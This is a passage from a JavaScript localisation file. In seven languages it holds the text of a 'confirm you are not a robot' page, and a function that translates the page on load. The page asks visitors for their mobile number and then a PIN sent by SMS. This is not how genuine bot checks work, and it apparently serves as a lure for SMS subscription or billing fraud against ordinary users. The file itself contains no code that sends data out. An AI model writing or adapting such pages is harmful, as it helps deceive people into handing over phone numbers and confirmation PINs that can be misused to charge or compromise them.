        a3: "Sisestage oma mobiilinumber kinnitamaks, et te pole robot.",
        a4_placeholder: "Telefoninumber",
        a5_value: "Saada",
        a6_value: "Sisestage teie telefonile saadetud PIN-kood",
        a7_value: "Saada",
        a8_value: "Palun sisestage oma PIN-kood",
        a9_value: "Palun sisestage kehtiv telefoninumber",
        a10: "Kinnitage, et te pole robot",
        a11: "<b>Samm 1:</b> Kinnitusprotsessi alustamiseks klõpsake nuppu Jätka<br> <b>Samm 2:</b> Sisestage oma mobiilinumber<br> <b>Samm 3:</b> Teile saadetakse tekstsõnum PIN-koodiga<br> <b>Samm 4:</b> Sisestage PIN-kood lõpetamiseks",
        a12: "Jätka"
      },
      sl: {
        a1: "Pozor!",
        a2: "Potrdite, da niste robot",
        a3: "Vnesite svojo mobilno številko za potrditev, da niste robot.",
        a4_placeholder: "Telefonska številka",
        a5_value: "Pošlji",
        a6_value: "Vnesite PIN kodo, poslano na vaš telefon",
        a7_value: "Pošlji",
        a8_value: "Prosimo, vnesite svoj PIN",
        a9_value: "Prosimo, vnesite veljavno telefonsko številko",
        a10: "Preverite, da niste robot",
        a11: "<b>Korak 1:</b> Kliknite gumb Nadaljuj za začetek postopka preverjanja<br> <b>Korak 2:</b> Vnesite svojo mobilno številko<br> <b>Korak 3:</b> Prejeli boste SMS s PIN kodo<br> <b>Korak 4:</b> Vnesite PIN kodo za dokončanje",
        a12: "Nadaljuj"
      },
      is: {
        a1: "Athugið!",
        a2: "Staðfestu að þú sért ekki vélmenni",
        a3: "Sláðu inn farsímanúmerið þitt til að staðfesta að þú sért ekki vélmenni.",
        a4_placeholder: "Símanúmer",
        a5_value: "Senda",
        a6_value: "Sláðu inn PIN-númerið sem sent var í símann þinn",
        a7_value: "Senda",
        a8_value: "Vinsamlegast sláðu inn PIN-númerið þitt",
        a9_value: "Vinsamlegast sláðu inn gilt símanúmer",
        a10: "Staðfestu að þú sért ekki vélmenni",
        a11: "<b>Skref 1:</b> Smelltu á Halda áfram hnappinn til að hefja staðfestingarferlið<br> <b>Skref 2:</b> Sláðu inn farsímanúmerið þitt<br> <b>Skref 3:</b> Þú færð SMS með PIN-númerinu<br> <b>Skref 4:</b> Sláðu inn PIN-númerið til að ljúka",
        a12: "Halda áfram"
  },
  sr: {
    a1: "Pažnja!",
    a2: "Potvrdite da niste robot",
    a3: "Unesite svoj broj mobilnog telefona da biste potvrdili da niste robot.",
    a4_placeholder: "Broj telefona",
    a5_value: "Pošalji",
    a6_value: "Unesite PIN kod poslat na vaš telefon",
    a7_value: "Pošalji",
    a8_value: "Molimo unesite vaš PIN",
    a9_value: "Molimo unesite važeći broj telefona",
    a10: "Proverite da niste robot",
    a11: "<b>Korak 1:</b> Kliknite na dugme Nastavi da započnete proces verifikacije<br> <b>Korak 2:</b> Unesite svoj broj mobilnog telefona<br> <b>Korak 3:</b> Primićete SMS poruku koja sadrži PIN kod<br> <b>Korak 4:</b> Unesite PIN kod da završite",
    a12: "Nastavi",
  },
  hr: {
    a1: "Pozor!",
    a2: "Potvrdite da niste robot",
    a3: "Unesite svoj broj mobilnog telefona kako biste potvrdili da niste robot.",
    a4_placeholder: "Broj telefona",
    a5_value: "Pošalji",
    a6_value: "Unesite PIN kod poslan na vaš telefon",
    a7_value: "Pošalji",
    a8_value: "Molimo unesite vaš PIN",
    a9_value: "Molimo unesite valjani broj telefona",
    a10: "Provjerite da niste robot",
    a11: "<b>Korak 1:</b> Kliknite na gumb Nastavi za početak postupka provjere<br> <b>Korak 2:</b> Unesite svoj broj mobilnog telefona<br> <b>Korak 3:</b> Primit ćete SMS poruku koja sadrži PIN kod<br> <b>Korak 4:</b> Unesite PIN kod za završetak",
    a12: "Nastavi",
  },
  kk: {
    a1: "Назар аударыңыз!",
    a2: "Сіз робот емес екеніңізді растаңыз",
    a3: "Сіз робот емес екеніңізді тексеру үшін мобильді телефон нөміріңізді енгізіңіз.",
    a4_placeholder: "Телефон нөмірі",
    a5_value: "Жіберу",
    a6_value: "Телефоныңызға жіберілген PIN кодын енгізіңіз",
    a7_value: "Жіберу",
    a8_value: "PIN кодыңызды енгізіңіз",
    a9_value: "Жарамды телефон нөмірін енгізіңіз",
    a10: "Сіз робот емес екеніңізді тексеріңіз",
    a11: "<b>1-қадам:</b> Тексеру процесін бастау үшін Жалғастыру түймесін басыңыз<br> <b>2-қадам:</b> Мобильді телефон нөміріңізді енгізіңіз<br> <b>3-қадам:</b> Сіз PIN кодын қамтитын SMS хабарламасын аласыз<br> <b>4-қадам:</b> Аяқтау үшін PIN кодын енгізіңіз",
    a12: "Жалғастыру",
  },
  ka: {
      a1: "ყურადღება!",
      a2: "დაადასტურეთ, რომ არ ხართ რობოტი",
      a3: "შეიყვანეთ თქვენი მობილურის ნომერი, რათა დავადასტუროთ, რომ არ ხართ რობოტი.",
      a4_placeholder: "ტელეფონის ნომერი",
      a5_value: "გაგზავნა",
      a6_value: "შეიყვანეთ PIN კოდი, რომელიც გამოიგზავნა თქვენს ტელეფონზე",
      a7_value: "გაგზავნა",
      a8_value: "გთხოვთ, შეიყვანოთ თქვენი PIN კოდი",
      a9_value: "გთხოვთ, შეიყვანოთ სწორი ტელეფონის ნომერი",
      a10: "დაადასტურეთ, რომ არ ხართ რობოტი",
      a11: "<b>ნაბიჯი 1:</b> დააჭირეთ გაგრძელების ღილაკს ვერიფიკაციის პროცესის დასაწყებად<br> <b>ნაბიჯი 2:</b> შეიყვანეთ თქვენი მობილურის ნომერი<br> <b>ნაბიჯი 3:</b> მიიღებთ SMS შეტყობინებას PIN კოდით<br> <b>ნაბიჯი 4:</b> შეიყვანეთ PIN კოდი დასასრულებლად",
      a12: "გაგრძელება",
  },
 
  
};

function translate() {
    var detected_language = detect_language();
    for (y in translation["source"]) {
        replace_text(detected_language, y);

    }

}
window.onload = translate()